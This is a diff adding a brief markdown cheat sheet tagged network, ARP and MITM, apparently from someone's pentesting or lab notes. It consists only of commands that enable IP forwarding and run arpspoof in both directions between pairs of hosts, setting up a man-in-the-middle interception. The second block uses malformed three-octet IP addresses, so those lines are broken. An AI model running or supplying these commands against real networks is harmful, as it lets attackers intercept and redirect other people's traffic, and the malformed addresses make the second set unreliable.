@@ -1,0 +1,14 @@
+---
+tags: [ network, arp, mitm ]
+---
+
+# forward, mitm, and redirect
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i tap0 -t 10.11.11.1 -r 10.11.10.34
+arpspoof -i tap0 -t 10.11.10.34 -r 10.11.11.1
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward  
+arpspoof -i tap0 -t 172.161.1 -r 172.162.13 
+arpspoof -i tap0 -t 172.162.13 -r 172.161.1 
